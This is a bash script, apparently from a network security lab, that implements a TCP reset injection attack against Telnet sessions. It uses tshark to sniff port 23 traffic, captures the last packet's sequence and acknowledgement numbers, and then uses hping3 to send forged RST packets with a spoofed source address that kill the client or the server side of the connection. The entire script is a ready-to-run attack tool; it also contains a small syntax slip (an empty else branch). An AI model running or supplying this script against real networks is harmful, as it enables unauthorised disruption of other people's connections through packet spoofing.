#!/bin/bash

IFACE="enp0s3"
PORT=23
STABILIZE_TIME=50
LAST_PKT_FILE="/tmp/last_packet_info.txt"
rm -f "$LAST_PKT_FILE"

silence_counter=0
first_packet_seen=false

while read -t 20 -a FIELDS; do

    if [ $? -eq 0 ]; then
        
        if [ "$first_packet_seen" = false ]; then
            echo "Packet detected"
            first_packet_seen=true
        fi
        silence_counter=0
        
        echo "${FIELDS[@]}" > "$LAST_PKT_FILE"
        
        TCP_PAYLOAD_LEN=${FIELDS[6]}
        
        LEN="${TCP_PAYLOAD_LEN:-0}"
        
        if [ "$LEN" -eq 0 ]; then
            echo "Src ${FIELDS[0]} -> Dst ${FIELDS[1]}"
            echo "Ver${FIELDS[7]} IHL${FIELDS[8]} TOS${FIELDS[9]} Len${FIELDS[10]} ID${FIELDS[11]} Flags${FIELDS[12]} TTL${FIELDS[13]} Proto${FIELDS[14]} Chk${FIELDS[15]}"
            echo "Sport${FIELDS[2]} Dport${FIELDS[3]} Seq${FIELDS[4]} Ack${FIELDS[5]} Len${FIELDS[16]} Flags${FIELDS[17]} Win${FIELDS[18]} Chk${FIELDS[19]} Urg${FIELDS[20]}"
        else
            echo -n "X"
        fi

    else
        if [ "$first_packet_seen" = true ]; then
            ((silence_counter++))
            echo -ne "\r $silence_counter / $STABILIZE_TIME seconds   "
            
            if [ "$silence_counter" -ge "$STABILIZE_TIME" ]; then
                echo "Connection Stabilized ($STABILIZE_TIME seconds of silence)"
                break
            fi
        else
        fi
    fi

done < <(tshark -i "$IFACE" -l -n \
    -Y "tcp.port == $PORT" \
    -T fields \
    -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport -e tcp.seq -e tcp.ack -e tcp.len \
    -e ip.version -e ip.hdr_len -e ip.dsfield -e ip.len -e ip.id -e ip.flags -e ip.ttl -e ip.proto -e ip.checksum \
    -e tcp.hdr_len -e tcp.flags -e tcp.window_size_value -e tcp.checksum -e tcp.urgent_pointer 2>/dev/null)


if [ ! -f "$LAST_PKT_FILE" ]; then
    echo "Exiting."
    exit 1
fi

read -a LAST_PKT < "$LAST_PKT_FILE"

L_SRC=${LAST_PKT[0]}
L_DST=${LAST_PKT[1]}
L_SPORT=${LAST_PKT[2]}
L_DPORT=${LAST_PKT[3]}
L_SEQ=${LAST_PKT[4]}
L_ACK=${LAST_PKT[5]}
L_LEN=${LAST_PKT[6]:-0}

echo "$L_SRC:$L_SPORT -> $L_DST:$L_DPORT"
echo "SEQ $L_SEQ  ACK $L_ACK  LEN $L_LEN"
echo "Which party do you want to kill?"
echo "1) Client"
echo "2) Server"
read -p "Select (1/2): " CHOICE

if [ "$L_SPORT" -eq 23 ]; then
    SERVER_IP=$L_SRC
    CLIENT_IP=$L_DST
    SERVER_PORT=23
    CLIENT_PORT=$L_DPORT 
    
    PKT_SEQ=$L_SEQ
    PKT_ACK=$L_ACK
    PKT_LEN=$L_LEN
    
    SEQ_TO_KILL_CLIENT=$PKT_ACK
    
    SEQ_TO_KILL_SERVER=$(($PKT_SEQ + $PKT_LEN))

else
    CLIENT_IP=$L_SRC
    SERVER_IP=$L_DST
    CLIENT_PORT=$L_SPORT 
    SERVER_PORT=23
    
    PKT_SEQ=$L_SEQ
    PKT_ACK=$L_ACK
    PKT_LEN=$L_LEN

    SEQ_TO_KILL_CLIENT=$(($PKT_SEQ + $PKT_LEN))
    
    SEQ_TO_KILL_SERVER=$PKT_ACK
fi


if [ "$CHOICE" == "1" ]; then
    echo "Killing Client ($CLIENT_IP)"
    sudo hping3 "$CLIENT_IP" \
        -a "$SERVER_IP" \
        -s "$SERVER_PORT" \
        -p "$CLIENT_PORT" \
        -R -A -M "$SEQ_TO_KILL_CLIENT" \
        -c 3 >/dev/null 2>&1

elif [ "$CHOICE" == "2" ]; then
    echo "Killing Server ($SERVER_IP)client ip "
    sudo hping3 "$SERVER_IP" \
        -a "$CLIENT_IP" \
        -s "$CLIENT_PORT" \
        -p "$SERVER_PORT" \
        -R -A -M "$SEQ_TO_KILL_SERVER" \
        -c 3 >/dev/null 2>&1
else
    echo "Enter valid choice."
    exit 1
fi
